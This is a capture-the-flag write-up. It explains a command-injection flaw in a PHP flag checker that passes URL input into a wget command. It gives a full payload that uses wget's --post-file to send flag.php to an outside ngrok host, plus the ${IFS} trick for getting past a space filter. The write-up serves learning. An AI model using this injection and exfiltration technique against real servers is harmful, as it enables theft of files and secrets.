# flag checker

## solution:

ok so we have this **web.php** here let's analyse it step by step:

* first it takes a value from **?flag** param in the URL and send it to **checkFlag** function

* check flag will prepare an **example_flag** then loop through our input and see if one of it's characters is not included in example_flag . if everything is fine , valid will be true and we can jump getFlag function. else we get **That is not a correct flag!**

* get flag will take our input and append it to ```wget -q -O - https://kuhi.to/flag/``` as cmd variable . it will execute the cmd and  store output in the array if the array is empty we get a Nope else we get a Maybe. 

## vulnerability:

notice that the script is executing a command and part of that command is our input . this must be a command injection but how ?

## exploit:

* first we complete the wget command by adding the parameter --post-file flag.php this will leak the content of flag.php

* create an ngrok link to get the content of the request 

* input will become: ?flag=744441c5e3a9.ngrok.io --post-file flag.php

* this won't pass the first check because there is no spaces in the example flag  

* replace spaces with **${IFS}** input become: ?flag=${IFS}744441c5e3a9.ngrok.io${IFS}--post-file${IFS}flag.php